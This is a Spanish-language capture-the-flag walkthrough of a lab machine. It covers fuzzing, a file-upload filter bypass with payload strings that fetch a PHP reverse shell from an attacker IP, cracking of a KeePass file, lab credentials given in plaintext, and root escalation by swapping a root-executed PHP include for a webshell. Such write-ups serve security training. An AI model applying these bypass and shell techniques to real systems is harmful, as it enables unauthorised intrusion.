Realizamos un escaneo de nmap
![[Pasted image 20240920113616.png]]

Al acceder al puerto 80 encontramos un portal de login
![[Pasted image 20240920113711.png]]

Realizamos fuzzing web para el descubrimiento de directorios y archivos
![[Pasted image 20240920114108.png]]

Encontramos una ruta de un directorio que parece que podemos subir archivos levantando un servidor
![[Pasted image 20240920114035.png]]

Si hacemos fuzzing en esta url de cloud encontramos otro directorio de images donde puede ser que almacene los archivos que enviemos
![[Pasted image 20240920122132.png]]

Ahora creamos un archivo y levantamos un servidor para ver si copiando la ruta nos hace una peticion
![[Pasted image 20240920122355.png]]

Pero vemos que no solicita nada
![[Pasted image 20240920122916.png]]

Ahora capturamos la peticion con burpsuite
![[Pasted image 20240920124703.png]]

Si ahora cambiamos el tipo de archivo y cambiamos a jpg al enviarlo podemos ver que ahora si que nos hace la peticion
![[Pasted image 20240920124917.png]]

Y vemos que nos ha realizado la peticion
![[Pasted image 20240920125244.png]]

Una vez comprobado esto, nuestro objetivo será que la web nos permita subir una webshell en php; y para ello tenemos esta url que nos indica cómo hacerlo:
https://book.hacktricks.xyz/pentesting-web/file-upload
![[Pasted image 20231029214856.png]]


Volvemos a realizar una caputa con burpsuite como si fueramos a subir el fichero y modificamos el final de la extensión `%0a.jpg`
```
http%3A%2F%2F10.9.0.219%3A4444%2Fphp-reverse-shell.php%0a.png
```
![[Pasted image 20240923084010.png]]

Si lo comprobamos vemos que se ha enviado correctamente
![[Pasted image 20240923084106.png]]

Otra forma de hacer el bypass es escribiendo un espacio entre nuestra shell y el .png de esta forma
```
http://10.9.0.219/shell.php .jpg
```

Dejamos de interceptar con burpsuite y al volver al navegador podremos ver como ha cambiado la pestaña, en la cual nos indica donde se ha guardado el fichero
![[Pasted image 20240923084239.png]]

Ahora abrimos otra pestaña y al ejecutar en el navegador el fichero nos generara la reverse shell
![[Pasted image 20240923100332.png]]


Ahora vamos a escalar privilegios de la maquina, para ello vamos a la ruta de `/opt` y encontramos un fichero `kdbx`
![[Pasted image 20240923103523.png]]

Nos lo descargamos
Maquina atacante
![[Pasted image 20240923104347.png]]

Maquina victima
![[Pasted image 20240923104403.png]]

Ahora lo crackeamos con john the ripper, al ser un fichero en formato `keepass` primero tendremos que generar el hash y luego crackearlo
```
741852963
```
![[Pasted image 20240923104645.png]]

Instalamos keepass si no lo tenemos instalado
![[Pasted image 20240923104958.png]]

Y al abrir el archivo y introducir la password obtenemos las credenciales del ususario `sysadmin`
```
sysadmin
Cl0udP4ss40p4city#8700
```
![[Pasted image 20240923105159.png]]

Probamos las credenciales y ya hemos accedido al usuario
![[Pasted image 20240923105329.png]]

Primera flag
![[Pasted image 20240923105358.png]]

Dentro de la carpeta del usuario encontramos un fichero .php el cual elimina las archivos que existan en la ruta de `cloud/images`
![[Pasted image 20240923110502.png]]

En la carpeta `lib`del usuario encontramos que es nuestra pero con permisos de root
![[Pasted image 20240923110905.png]]

Dentro de la carpeta encontramos muchos ficheros .php los cuales todos el usuario es root pero la carpeta es nuestra, dentro de el encontramos un fichero que llama la atencion por el tamaño que es diferente
![[Pasted image 20240923111141.png]]

Ahora eliminamos el fichero y lo reemplazamos por nuestra webshell
```
rm /home/sysadmin/scripts/lib/backup.inc.php
```
![[Pasted image 20240923112714.png]]

Creamos nuestra webshell de php y la copiamos con el mismo nombre
![[Pasted image 20240923112755.png]]
![[Pasted image 20240923112931.png]]

Ahora nos ponemos a la esucha con netcat y esperamos a que se ejecute el script y ya seremos root
![[Pasted image 20240923112634.png]]

Flag de root
![[Pasted image 20240923113049.png]]


Otra forma de ver el script que se ejecuta es revisandolo con `pspy64`
![[Pasted image 20240923113230.png]]
![[Pasted image 20240923113353.png]]






